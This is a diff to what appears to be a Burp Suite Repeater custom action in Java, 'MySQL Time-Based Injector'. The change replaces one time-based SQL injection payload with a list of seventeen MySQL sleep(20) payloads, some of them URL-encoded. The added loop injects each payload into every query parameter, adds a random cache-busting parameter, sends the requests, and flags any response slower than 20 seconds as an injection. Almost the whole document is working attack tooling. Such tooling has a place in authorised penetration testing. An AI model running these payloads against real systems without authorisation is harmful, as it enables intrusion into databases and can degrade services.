@@ -1,4 +1,4 @@
-id: 6d3849a7-6973-4f1f-b7db-ca61cf866f28
+id: a1c7e97b-71c8-459f-8d07-691863687ca1
 name: MySQL Time-Based Injector
 function: CUSTOM_ACTION
 location: REPEATER
@@ -8,8 +8,29 @@ source: |+
    * Sends each mutated request sequentially and logs high-level timing data
    * so you can watch for slow responses in Logger or the console.
    **/
-  var payload = "'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z";
+  
+  var payloads = java.util.List.of(
+      "'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
+      "'(select(1)from(select(sleep(20)))a)'",
+      "(select(1)from(select(sleep(20)))a)",
+      "(select(1)from(select(sleep(20)))a)--%20z",
+      "'%2b(select(1)from(select(sleep(20)))a)%2b'",
+      "-(select(1)from(select(sleep(20)))a)",
+      ",(select(1)from(select(sleep(20)))a)",
+      ",(select(1)from(select(sleep(20)))a)--%20z",
+      "'OR(select(1)from(select(sleep(20)))a)OR'Z",
+      "'AND(select(1)from(select(sleep(20)))a)AND'Z",
+      "%20AND%20(select(1)from(select(sleep(20)))a)--%20z",
+      "'%20AND%20(select(1)from(select(sleep(20)))a)--%20z",
+      ")%20AND%20(select(1)from(select(sleep(20)))a)--%20z",
+      "')%20AND%20(select(1)from(select(sleep(20)))a)--%20z",
+      "->test\"',(select(1)from(select(sleep(20)))a)--%20z\"'",
+      "->test\"%27))%23%20(select(1)from(select(sleep(20)))a)--%20z",
+      "->test\"'%20ASC,%20(select(1)from(select(sleep(20)))a)%20DESC--%20z\"'"
+  );
+  
   var bypassCache = true;
+  var detectionThresholdMs = 20000L;
   
   var baseRequest = requestResponse.request();
   if (baseRequest == null) return;
@@ -31,46 +52,53 @@ source: |+
       int sep = pair.indexOf('=');
       var name = (sep >= 0) ? pair.substring(0, sep) : pair;
       var value = (sep >= 0) ? pair.substring(sep + 1) : "";
+
+      for (String payload : payloads) {
+          var builder = new StringBuilder();
+          for (int j = 0; j < pairs.length; j++) {
+              if (j > 0) builder.append("&");
+              if (j == i) {
+                  builder.append(name).append("=").append(value).append(payload);
+              } else {
+                  builder.append(pairs[j]);
+              }
+          }
   
-      var builder = new StringBuilder();
-      for (int j = 0; j < pairs.length; j++) {
-          if (j > 0) builder.append("&");
-          if (j == i) {
-              builder.append(name).append("=").append(value).append(payload);
+          if (bypassCache) {
+              var cacheBuster = new StringBuilder();
+              for (int k = 0; k < 14; k++) {
+                  cacheBuster.append(alphabet.charAt(secureRandom.nextInt(alphabet.length())));
+              }
+              builder.append("&_czb=").append(cacheBuster);
+          }
+  
+          var mutatedPath = basePath + "?" + builder.toString();
+          var mutatedRequest = baseRequest.withPath(mutatedPath);
+
+          logging().logToOutput("[MySQLTimeBased] Started...");
+
+          var result = api().http().sendRequest(mutatedRequest);
+          if (!result.hasResponse()) {
+              logging().logToOutput("[WARN] No response for param " + name);
+              continue;
+          }
+  
+          var timingOpt = result.timingData();
+          if (timingOpt.isEmpty()) continue;
+
+          var timing = timingOpt.get();
+          java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
+          java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
+          long startMs = (tStart != null ? tStart.toMillis() : -1);
+          long endMs = (tEnd != null ? tEnd.toMillis() : -1);
+
+          if (endMs >= detectionThresholdMs && endMs != -1) {
+              logging().logToOutput("[MySQLTimeBased] SQL injection detected in param " + name + " using payload: " + payload);
+              httpEditor.responsePane().set(result.response().toByteArray());
+              httpEditor.requestPane().set(mutatedRequest.toByteArray());
           } else {
-              builder.append(pairs[j]);
+              logging().logToOutput("[MySQLTimeBased] No findings for param " + name + " using payload: " + payload);
           }
       }
-  
-      if (bypassCache) {
-          var cacheBuster = new StringBuilder();
-          for (int k = 0; k < 14; k++) {
-              cacheBuster.append(alphabet.charAt(secureRandom.nextInt(alphabet.length())));
-          }
-          builder.append("&_czb=").append(cacheBuster);
-      }
-  
-      var mutatedPath = basePath + "?" + builder.toString();
-      var mutatedRequest = baseRequest.withPath(mutatedPath);
-  
-      var result = api().http().sendRequest(mutatedRequest);
-      if (!result.hasResponse()) {
-          logging().logToOutput("[WARN] No response for param " + name);
-          continue;
-      }
-  
-      var timingOpt = result.timingData();
-      if (timingOpt.isEmpty()) continue;
-  
-      var timing = timingOpt.get();
-      java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
-      java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
-      long startMs = (tStart != null ? tStart.toMillis() : -1);
-      long endMs = (tEnd != null ? tEnd.toMillis() : -1);
-      logging().logToOutput(
-          "[MySQLTimeBased] param=" + name +
-          " start=" + startMs + "ms" +
-          " end=" + endMs + "ms"
-      );
   }
 
